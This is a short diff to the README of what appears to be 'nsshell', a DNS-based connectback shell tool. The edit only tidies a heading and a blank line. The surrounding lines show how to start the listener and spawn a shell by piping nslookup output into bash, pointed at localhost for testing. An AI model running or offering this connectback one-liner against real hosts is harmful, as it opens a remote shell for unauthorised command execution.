@@ -23,8 +23,7 @@ sudo make install
 ### Run Server - localhost for testing
 sudo python nsshell.py localhost 127.0.0.1
 
-###Spawn Connectback shell- localhost for testing
+### Spawn Connectback shell - localhost for testing
 nslookup 1 localhost | bash
-
 
 That's all folks!
